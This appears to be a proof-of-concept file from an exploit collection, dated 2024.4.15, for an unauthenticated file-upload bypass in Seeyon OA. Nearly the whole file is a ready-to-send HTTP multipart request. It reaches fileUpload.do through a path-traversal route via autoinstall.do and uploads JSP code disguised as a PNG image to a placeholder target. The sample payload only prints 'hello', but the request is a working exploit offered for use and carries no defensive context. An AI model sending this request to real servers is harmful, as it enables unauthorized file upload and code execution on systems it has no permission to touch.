# seeyon_fileUpload.do_fileupload
from: https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-OA%E5%89%8D%E5%8F%B0fileUpload.do%E5%AD%98%E5%9C%A8%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md

2024.4.15 @@


```
POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
Host: your-ip
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)

--00content0boundary00
Content-Disposition: form-data; name="type"


--00content0boundary00
Content-Disposition: form-data; name="extensions"

png
--00content0boundary00
Content-Disposition: form-data; name="applicationCategory"


--00content0boundary00
Content-Disposition: form-data; name="destDirectory"


--00content0boundary00
Content-Disposition: form-data; name="destFilename"


--00content0boundary00
Content-Disposition: form-data; name="maxSize"


--00content0boundary00
Content-Disposition: form-data; name="isEncrypt"

false
--00content0boundary00
Content-Disposition: form-data; name="file1"; filename="1.png"
Content-Type: Content-Type: application/pdf

<% out.println("hello");%>
--00content0boundary00--
```
